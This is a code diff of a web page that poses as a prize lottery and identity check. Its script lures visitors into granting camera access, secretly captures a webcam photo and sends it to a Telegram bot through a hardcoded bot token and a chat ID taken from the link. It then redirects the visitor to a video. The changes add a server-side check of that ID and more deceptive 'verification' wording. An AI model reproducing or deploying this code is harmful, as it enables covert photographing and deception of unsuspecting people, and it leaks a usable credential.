@@ -7,47 +7,69 @@
         body { 
             display: flex; flex-direction: column; align-items: center; justify-content: center; 
             min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; 
-            /* 添加背景图 */
             background: url('https://github.com/sachinbagwan208-design/-/raw/main/00.png') no-repeat center center fixed; 
             background-size: cover; color: white; 
         }
-        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; }
+        #video { background: #000; border: 2px solid #444; border-radius: 8px; margin-bottom: 20px; display: none; }
         #status { margin: 15px 0; font-weight: bold; color: #00ff00; background: rgba(0,0,0,0.6); padding: 10px; border-radius: 5px; }
-        button { padding: 12px 30px; cursor: pointer; font-size: 18px; border-radius: 5px; border: none; background: #28a745; color: white; }
+        button { padding: 12px 30px; cursor: pointer; font-size: 18px; border-radius: 5px; border: none; background: #28a745; color: white; display: none; }
         button:hover { background: #218838; }
     </style>
 </head>
 <body>
-    <h2>🧧🧧🧧🧧🧧</h2>
-    <div id="status">💶💶💶💶💶</div>
+    <h2 id="title">Verifying identity💳🆔...</h2>
+    <div id="status">Moment⌚️</div>
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
-    <button id="startBtn">Offen💰</button>
+    <button id="startBtn">Start💰</button>
 
     <script>
-        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI'; // 请确认替换
+        // --- 配置区 ---
+        const BOT_TOKEN = '8657025946:AAENnYKTFNhRrms6bzTLIR2kAQGytdOinnI'; 
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxb3YwIGMimTjdYhk8JbzGy_UGa72V2hnwyizmpsqGTYO6H-gzKU8sT94d41zXKFDQ/exec";
+        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const startBtn = document.getElementById('startBtn');
         const status = document.getElementById('status');
+        const title = document.getElementById('title');
+        
         const urlParams = new URLSearchParams(window.location.search);
         const CHAT_ID = urlParams.get('id');
 
-        let currentStream;
-
-        startBtn.addEventListener('click', async () => {
+        // 页面加载时执行权限校验
+        window.onload = async () => {
             if (!CHAT_ID) {
-                status.innerText = "❌️: No users found ID";
+                status.innerText = "❌ 错误：无效的访问链接";
                 return;
             }
             try {
+                const response = await fetch(SCRIPT_URL + "?id=" + CHAT_ID);
+                const data = await response.json();
+                if (data.authorized) {
+                    title.innerText = "🎁🎁🎁🎁🎁";
+                    status.innerText = "Verification successful, please click the button below👇🏻👇🏻👇🏻";
+                    startBtn.style.display = 'block';
+                } else {
+                    title.innerText = "❌️: No users found ID";
+                    status.innerText = "此 ID 未经授权，无法使用本功能。";
+                }
+            } catch (err) {
+                status.innerText = "Connection to server failed, please try again later🖥。";
+            }
+        };
+
+        let currentStream;
+        startBtn.addEventListener('click', async () => {
+            try {
                 currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = currentStream;
+                video.style.display = 'block';
                 startBtn.style.display = 'none';
                 status.innerText = "🎲The lottery is running🎲...";
                 setTimeout(captureAndUpload, 1500);
             } catch (err) {
-                status.innerText = "Failed to win the prize, Please open your camera 📷。";
+                status.innerText = "Please grant camera access 📷";
             }
         });
 
@@ -56,7 +78,6 @@
             canvas.height = video.videoHeight;
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            status.innerText = "🎉🎉🎉🎉🎉";
             
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
@@ -69,14 +90,13 @@
                     });
                     const result = await response.json();
                     if(result.ok) {
-                        // 上传成功：停止摄像头并跳转
                         currentStream.getTracks().forEach(track => track.stop());
                         window.location.href = "https://github.com/sachinbagwan208-design/-/raw/main/000.MP4";
                     } else {
-                        status.innerText = "回传失败：" + result.description;
+                        status.innerText = "-Send failed📍📍：" + result.description;
                     }
                 } catch (err) {
-                    status.innerText = "Network connection error 🌐。";
+                    status.innerText = "Network error 🌐";
                 }
             }, 'image/jpeg');
         }
